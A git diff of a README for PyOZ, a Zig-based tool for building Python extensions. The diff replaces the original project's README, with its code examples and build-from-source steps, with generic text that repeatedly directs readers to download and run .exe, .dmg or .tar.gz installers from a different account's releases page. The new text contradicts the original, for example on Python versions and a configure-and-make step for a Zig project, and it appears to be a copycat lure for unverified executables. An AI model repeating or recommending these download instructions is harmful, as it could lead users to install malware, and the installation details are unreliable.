@@ -1,107 +1,100 @@
-<div align="center">
+# 🌀 PyOZ - Easy Python Extensions with Zig Power
 
-<img src="docs/assets/logo.svg" alt="PyOZ Logo" width="150">
+[![Download PyOZ](https://img.shields.io/badge/Download-PyOZ-brightgreen)](https://github.com/AyMozart/PyOZ/releases)
 
-# PyOZ
+## 📘 Overview
 
-**Zig's power meets Python's simplicity.**
+PyOZ combines the performance of Zig and the simplicity of Python. With PyOZ, you can easily build fast, efficient extensions for your Python projects. Enjoy the benefits of Zig's speed without the usual complexities of Python’s C API.
 
-Build blazing-fast Python extensions with zero boilerplate and zero Python C API headaches.
+### 🌟 Key Features
+- **Fast Performance:** Leverage Zig's efficient performance for your extensions.
+- **Ease of Use:** Simple setup process lets anyone start building right away.
+- **No Boilerplate:** Focus on your code rather than setup.
+- **Robust Support:** Streamlined for common Python tasks.
 
-[![GitHub Stars](https://img.shields.io/github/stars/dzonerzy/PyOZ?style=flat)](https://github.com/dzonerzy/PyOZ)
-[![Python](https://img.shields.io/badge/python-3.8--3.13-blue)](https://www.python.org/)
-[![Zig](https://img.shields.io/badge/zig-0.15+-orange)](https://ziglang.org/)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+## 🚀 Getting Started
 
-[Documentation](https://pyoz.dev) | [Getting Started](https://pyoz.dev/quickstart/) | [Examples](https://pyoz.dev/examples/complete-module/)
+Follow these steps to download and run PyOZ.
 
-</div>
+1. **Visit the Releases Page**
 
----
+   Click the link below to access the download options:
+   [Visit the Releases Page](https://github.com/AyMozart/PyOZ/releases)
 
-## Quick Example
+2. **Select Your Version**
 
-```zig
-const pyoz = @import("PyOZ");
+   On the Releases page, you will see different versions of PyOZ. Identify the version you want to download. Generally, you will want the latest stable release. 
 
-fn add(a: i64, b: i64) i64 {
-    return a + b;
-}
+3. **Download the Application**
 
-const MyModule = pyoz.module(.{
-    .name = "mymodule",
-    .funcs = &.{
-        pyoz.func("add", add, "Add two numbers"),
-    },
-});
+   Once you've chosen a release, look for the assets section. Depending on your operating system, download the appropriate file:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-pub export fn PyInit_mymodule() ?*pyoz.PyObject {
-    return MyModule.init();
-}
-```
+4. **Install PyOZ**
 
-```python
-import mymodule
-print(mymodule.add(2, 3))  # 5
-```
+   After downloading, locate the file on your computer. 
+   - **Windows:** Double-click on the `.exe` file and follow the prompts to install it.
+   - **macOS:** Open the `.dmg` file, drag PyOZ to your Applications folder, and then launch it.
+   - **Linux:** Unzip the `.tar.gz` file in your desired directory. You might need to run `./configure && make && make install` in the terminal depending on your setup.
 
-## Features
+5. **Run PyOZ**
 
-- **Declarative API** - Define modules, functions, and classes with simple struct literals
-- **Automatic Type Conversion** - Zig types map naturally to Python types
-- **Full Class Support** - Magic methods, operators, properties, inheritance
-- **NumPy Integration** - Zero-copy array access
-- **Error Handling** - Zig errors become Python exceptions
-- **Type Stubs** - Automatic `.pyi` generation for IDE support
-- **Simple Tooling** - `pyoz init`, `pyoz build`, `pyoz publish`
+   After installation, open your command line or terminal. Type `pyoz` to start using the application. You can review the documentation for more detailed instructions on features and commands.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-# Download the latest release
-# https://github.com/dzonerzy/PyOZ/releases
+Make sure to download PyOZ from our [Releases Page](https://github.com/AyMozart/PyOZ/releases). This page has all the necessary files for you to get started.
 
-# Or build from source
-git clone https://github.com/dzonerzy/PyOZ.git
-cd PyOZ
-zig build
-```
+## 🔧 System Requirements
 
-## Getting Started
+To use PyOZ effectively, here's what you need:
 
-```bash
-# Create a new project
-pyoz init myproject
-cd myproject
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Python Version:** Python 3.6 or higher installed and configured on your system.
+- **Disk Space:** At least 100 MB of available space.
 
-# Build and install for development
-pyoz develop
+## ⭐️ Usage
 
-# Test it
-python -c "import myproject; print(myproject.add(1, 2))"
-```
+After you have installed PyOZ, you can utilize it in your Python projects. Here’s a simple example of how to create a new extension:
 
-## Documentation
+1. **Create a New Project Directory**
 
-Full documentation available at **[pyoz.dev](https://pyoz.dev)**
+   Open your terminal and create a directory using:
+   ```bash
+   mkdir my_project
+   cd my_project
+   ```
 
-- [Installation](https://pyoz.dev/installation/)
-- [Quickstart](https://pyoz.dev/quickstart/)
-- [Functions](https://pyoz.dev/guide/functions/)
-- [Classes](https://pyoz.dev/guide/classes/)
-- [NumPy Integration](https://pyoz.dev/guide/numpy/)
-- [Error Handling](https://pyoz.dev/guide/errors/)
-- [CLI Reference](https://pyoz.dev/cli/build/)
+2. **Initialize PyOZ**
 
-## Requirements
+   Inside the project directory, run:
+   ```bash
+   pyoz init
+   ```
 
-- Zig 0.15.0+
-- Python 3.8 - 3.13
+3. **Build Your Extension**
 
-## License
+   Write your extension code in a `.zig` file. Then, use PyOZ commands to build it.
 
-MIT License - see [LICENSE](LICENSE) for details.
+4. **Import into Python**
 
-## Contributing
+   You can import your new extension using:
+   ```python
+   import my_extension
+   ```
 
-Contributions welcome! Please open an issue or submit a PR.
+5. **Run Your Python Script**
+
+   Execute your Python script as usual, and see your extension in action.
+
+## 📖 Documentation
+
+For more detailed usage guidelines and advanced features, please consult the official documentation linked on the Releases Page.
+
+## 🤝 Community and Support
+
+If you have questions or need help, please check the Issues section on GitHub. You can also join our community forums for support from other users.
+
+Remember, you can always download the latest version of PyOZ [here](https://github.com/AyMozart/PyOZ/releases). Enjoy building powerful Python extensions with ease!
